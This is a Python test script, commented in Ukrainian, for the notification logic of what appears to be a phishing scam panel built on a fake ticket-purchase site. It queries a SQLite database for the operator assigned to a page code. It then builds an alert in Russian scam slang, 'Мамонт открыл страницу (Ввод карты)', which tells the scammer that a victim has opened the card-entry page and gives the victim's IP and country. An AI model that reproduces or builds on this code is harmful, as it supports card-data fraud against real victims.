#!/usr/bin/env python3
"""
Тест логіки функції send_activity_notification_to_admin
"""

import sqlite3

def test_notification_logic():
    """Тестує логіку функції send_activity_notification_to_admin"""
    
    print("🧪 Тестування логіки send_activity_notification_to_admin...")
    
    # Підключаємося до бази даних
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        print("✅ Підключення до бази даних успішне")
    except Exception as e:
        print(f"❌ Помилка підключення до бази даних: {e}")
        return
    
    # Тестові дані
    test_cases = [
        {
            "page_code": "1-4",
            "user_ip": "37.52.215.105",
            "user_country": "UA",
            "page_name": "Ввод карты",
            "page_url": "/buy-tickets/loading/",
            "action_type": "page_view"
        },
        {
            "page_code": "1-5",
            "user_ip": "192.168.1.1",
            "user_country": "US",
            "page_name": "Ввод карты",
            "page_url": "/buy-tickets/loading/",
            "action_type": "page_view"
        }
    ]
    
    for i, test_case in enumerate(test_cases, 1):
        print(f"\n📋 Тест {i}: {test_case['page_code']}")
        
        try:
            # Імітуємо логіку send_activity_notification_to_admin
            page_code = test_case['page_code']
            user_ip = test_case['user_ip']
            user_country = test_case['user_country']
            page_name = test_case['page_name']
            page_url = test_case['page_url']
            action_type = test_case['action_type']
            
            # Отримуємо admin_id за page_code
            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
            row = c.fetchone()
            
            if not row:
                # Якщо не знайдено в event_links, шукаємо в site_users
                c.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
                row = c.fetchone()
            
            if row:
                admin_id = row[0]
                print(f"   ✅ Знайдено admin_id: {admin_id}")
                
                # Формуємо повідомлення
                message = f"""🔔Мамонт открыл страницу ({page_name})

📎Страница: {page_name}
#️⃣Ссылка: ?page={page_code}
📶IP: {user_ip}
🌎Страна: {user_country}"""
                
                print(f"   📝 Сформоване повідомлення:")
                print(f"   {message}")
                
                # Перевіряємо, чи існує користувач
                c.execute('SELECT user_id, username FROM users WHERE user_id=?', (admin_id,))
                user_row = c.fetchone()
                if user_row:
                    print(f"   👤 Адмін знайдений: ID={user_row[0]}, username={user_row[1]}")
                else:
                    print(f"   ⚠️ Адмін не знайдений в таблиці users")
                
            else:
                print(f"   ❌ admin_id не знайдено для page_code: {page_code}")
                
        except Exception as e:
            print(f"   ❌ Помилка: {e}")
    
    # Показуємо статистику
    print(f"\n📊 Статистика:")
    
    c.execute('SELECT COUNT(*) FROM event_links')
    event_links_count = c.fetchone()[0]
    print(f"   event_links: {event_links_count} записів")
    
    c.execute('SELECT COUNT(*) FROM site_users')
    site_users_count = c.fetchone()[0]
    print(f"   site_users: {site_users_count} записів")
    
    c.execute('SELECT COUNT(*) FROM users')
    users_count = c.fetchone()[0]
    print(f"   users: {users_count} записів")
    
    conn.close()
    print(f"\n✅ Тест завершено")

if __name__ == "__main__":
    test_notification_logic()
